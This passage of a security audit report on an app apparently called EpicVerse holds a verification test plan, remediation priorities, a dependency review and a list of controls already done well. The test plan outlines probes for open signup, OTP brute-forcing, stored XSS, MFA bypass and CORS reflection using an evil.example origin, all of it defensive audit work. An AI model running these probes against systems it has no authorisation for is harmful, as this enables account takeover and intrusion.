4. **Firebase App Check / open signup (F-06):** attempt `accounts:signUp` against Identity Toolkit with the app's API key; then `POST /sync-user` with no invite; confirm the account can call `/process-audio` and `/ws/realtime`.
5. **OTP brute-force (F-07):** measure whether any WAF / Cloud Armor rate limit exists on `/auth/verify-otp`; script bounded guesses in a 60-second window against a test address.
6. **Stored XSS (F-08):** set `display_name` to a benign marker payload, load `/admin/dashboard?key=…` in a test browser, confirm execution and that `location.search` is readable to injected script; verify no CSP header is present.
7. **MFA enforcement (F-09):** with MFA "enabled" on a test account, use the raw ID token from `signInWithEmailAndPassword` directly against `/process-audio` — confirm it succeeds without OTP.
8. **Realtime proxy abuse (F-10):** as a normal user, send `session.update` with custom `instructions`/`tools` then `response.create`; confirm the server forwards it and OpenAI honours it; check for any concurrency/turn caps.
9. **GCS (F-19):** inspect bucket IAM, uniform bucket-level access, object lifecycle, and whether `inputs/*.wav` is publicly readable or ever deleted.
10. **CORS (F-12):** send `Origin: https://evil.example` and confirm the reflected `Access-Control-Allow-Origin` + `Access-Control-Allow-Credentials: true`, and that `/process-audio` `X-*` headers are exposed.
11. **Sentry (F-14):** trigger a failing request in a staging build and inspect the delivered Sentry event for `Authorization`, OTP, email, or body content.

---

## Remediation Priority

### 1 — Fix immediately (pre-empt active compromise)
- **F-01** Rotate the Postgres password; move to a least-privilege role; scrub history.
- **F-02** Disable/replace the exposed service-account key(s); prefer Workload Identity (no key file); scrub history; audit usage.
- **F-03** Authenticate `/admin/purge-expired-deletions`.
- **F-04** Remove/replace the static admin key; server-side admin authZ; never in the query string.
- **F-05** Add auth + ownership check to `GET /user/{firebase_id}`; make deletion auto-cancel an authenticated POST.
- **F-11** Remove the `EPIC-DEV-2026` master code.
- Purge `EpicVerse_Invite_Keys_Final.xlsx` / invite spreadsheets and the audit dumps from history (already untracked in the working tree).

### 2 — Fix before production
- **F-06** Enforce invite validation server-side (and/or block open Firebase signup + App Check).
- **F-07** Rate-limit + lock out `/auth/verify-otp`; CSPRNG OTP; distributed limiter.
- **F-08** Escape all user data in the admin dashboard; add CSP; validate `display_name`.
- **F-09** Enforce MFA / email-verification server-side; step-up auth for sensitive actions.
- **F-10** Whitelist client WS events; per-user quotas/concurrency/turn caps; spend alerts.
- **F-12** Lock down CORS.
- **F-13** Ignore client-supplied `email`; remove client-writable `mfa_enabled`.
- **F-15 / F-16** Stop logging OTPs/secrets/transcripts; generic client errors + correlation ids; lock down `/health`.
- **F-19** Align voice-data handling with the Privacy Policy; bucket lifecycle + private ACLs.

### 3 — Medium-term improvements
- **F-14** Sentry: `sendDefaultPii=false`, scrubbers, lower sampling.
- **F-17** Escape user data in notification emails.
- **F-18** Uniform responses to remove enumeration oracles.
- **F-20** Non-root container, multi-stage build, allow-list `.dockerignore`, image scanning in CI.
- **F-21** `verify_session` fail-closed.
- **F-22** Cap / relocate `profile_picture`.

### 4 — Security hardening
- **F-23** Real SPKI pinning (or remove dead code) + iOS pinning.
- **F-24 / F-25 / F-26** High-entropy secrets from a secret manager; CSPRNG; Redis-backed limits.
- **F-27** Restrict Firebase API keys (app + API scope); keep config files out of git.
- **F-28** Gate Flutter logging on `kDebugMode`; never log tokens/bodies.
- **F-29 / F-30** Remove dead/misleading code; confirm no static-token path on `/ws/realtime`.
- Add a `SECURITY.md` responsible-disclosure contact; add secret-scanning (gitleaks/trufflehog) and dependency scanning (`pip-audit`, `flutter pub outdated`, Dependabot) to CI. Consider a load-balancer WAF (Cloud Armor) with rate limiting in front of Cloud Run.

---

## Dependencies

No dependency was confirmed to carry a specific published CVE from static evidence alone; the items below need verification against an advisory database (`pip-audit`, GitHub advisories).

**Backend — `backend/scripts/requirements.txt` (note: pinned, and several are old):**

| Package | Pinned | Note — Needs Verification |
|---|---|---|
| `fastapi` | 0.103.2 | ~2 years old; many releases since, some security-relevant (CORS, multipart). Upgrade and re-test. |
| `starlette` | (transitive of fastapi 0.103.2) | Older Starlette versions had multipart DoS advisories (e.g. GHSA around `python-multipart`/form parsing). Verify resolved version. |
| `python-multipart` | 0.0.6 | Known DoS advisories fixed in later 0.0.7+/0.0.9. **Likely vulnerable — verify and bump.** |
| `uvicorn` | 0.23.2 | Old; upgrade. |
| `openai` | 1.3.5 | Very old SDK; Realtime API surface has changed a lot — functional + maintenance risk. |
| `firebase-admin` | 6.2.0 | Behind current; upgrade for security fixes in transitive `google-*`/`grpcio`. |
| `redis` | 5.0.1 | Upgrade to latest 5.x. |
| `pandas` | 2.1.1 / `numpy` >=1.26 | `numpy` unpinned upper bound can pull incompatible 2.x. Pin a range. |
| `websockets` | 12.0 | `realtime_service.py` uses the deprecated `websockets.legacy` client — will break on `websockets` 13+. Plan the migration. |
| `google-cloud-*` | pinned older | Upgrade; transitive `grpcio`/`protobuf` get regular security fixes. |

Action: run `pip-audit -r backend/scripts/requirements.txt`, adopt a lockfile (`pip-compile`/`uv`), enable Dependabot.

**Frontend — `frontend/EpicVerseApp/pubspec.yaml`:** dependencies are current-looking (`dio ^5.9.2`, `firebase_auth ^6.3.0`, `flutter_riverpod ^3.3.1`, `sentry_flutter ^9.25.0`). `flutter_jailbreak_detection ^1.10.0` — verify still maintained. Run `flutter pub outdated` and `dart pub audit` in CI. Note `flutter_jailbreak_detection` / root detection is bypassable on a determined attacker's device — treat as telemetry, not a control.

---

## What is already done well (preserve)

- Firestore rules: deny-by-default, `request.auth.uid == userId` scoping.
- Android `network_security_config.xml`: correct SPKI pin-set, `includeSubdomains`, expiry.
- `allowBackup="false"`; iOS ATS left at default (enforced); scoped photo-picker instead of broad storage permission.
- Parameterised SQL throughout (`asyncpg` `$1,$2` / `int()` coercion in `query_postgres_database`) — no SQL injection found.
- Swagger/OpenAPI/ReDoc disabled when `ENV` is production (`main.py`).
- WebSocket auth moved to the `Authorization` header (query-string `?token=` kept only as a logged legacy fallback).
- Soft-delete with a 30-day grace window; delete/cancel endpoints check `caller_uid == firebase_id`.
- `.dockerignore` excludes `.env`, credential JSON, spreadsheets, logs.
